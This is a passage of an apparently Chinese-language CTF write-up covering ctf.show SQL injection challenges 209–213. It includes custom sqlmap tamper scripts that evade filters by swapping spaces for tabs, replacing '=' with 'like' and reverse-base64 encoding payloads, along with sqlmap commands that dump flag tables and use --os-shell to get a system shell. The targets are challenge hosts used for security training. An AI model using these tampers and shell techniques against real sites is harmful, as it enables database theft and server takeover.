== <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x9</span>)<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot;=&quot;</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x9</span>) + <span class="hljs-string">&quot;like&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x9</span>)<br>                <span class="hljs-keyword">continue</span><br>            retVal += payload[i]<br>        <span class="hljs-keyword">return</span> retVal    <br></code></pre></td></tr></table></figure>

           <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;http://d692eb86-93f0-47d7-ab6c-41237665a80f.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://d692eb86-93f0-47d7-ab6c-41237665a80f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; --dbms mysql  --tamper=ctfshow209.py -D ctfshow_web -T ctfshow_flav -C &quot;ctfshow_flagx&quot; --dump<br></code></pre></td></tr></table></figure>

      210. sqlmap 

           这里有个自定义操作

           <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> strrev(base64_decode(strrev(base64_decode($<span class="hljs-built_in">id</span>))));<br></code></pre></td></tr></table></figure>

           我们需要逆着来，过程刚开始没想清楚。逆过来应该是先从外层开始

           <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 核心</span><br>retVal = b64encode(retVal[::-<span class="hljs-number">1</span>].encode()).decode()<br>retVal = b64encode(retVal[::-<span class="hljs-number">1</span>].encode()).decode()<br></code></pre></td></tr></table></figure>

           <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;http://366f932d-951c-4aec-b6e2-bab9aa459827.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://366f932d-951c-4aec-b6e2-bab9aa459827.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; --dbms mysql  --tamper=ctfshow209.py -D ctfshow_web -T ctfshow_flavi -C &quot;ctfshow_flagxx&quot; --dump<br></code></pre></td></tr></table></figure>

      211. sqlmap

           先两关的组合，直接打

      212. sqlmap 一样

      213. sqlmap 在三题的基础上练习getshell

           ![image-20220820173840013](/image-20220820173840013.png)

           这里拿到了网站根目录的shell，上面有两个临时文件

           ![image-20220820174533319](/zouErhlZTPN1HdY.png)

           一个是命令执行文件，可以直接执行系统命令

           <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;http://140cb7d1-5ec7-495d-892a-3160ce479404.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://140cb7d1-5ec7-495d-892a-3160ce479404.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; --dbms mysql  --tamper=ctfshow209.py --os-shell<br></code></pre></td></tr></table></figure>
</code></pre><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/09/11/CTF-SHOW%20XSS%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">← Next CTFSHOW-XSS</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTFSHOW-文件上传 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RacerZ</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="qiyizhang2002@foxmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF-SHOW-SQL-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">CTF-SHOW SQL 做题记录</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>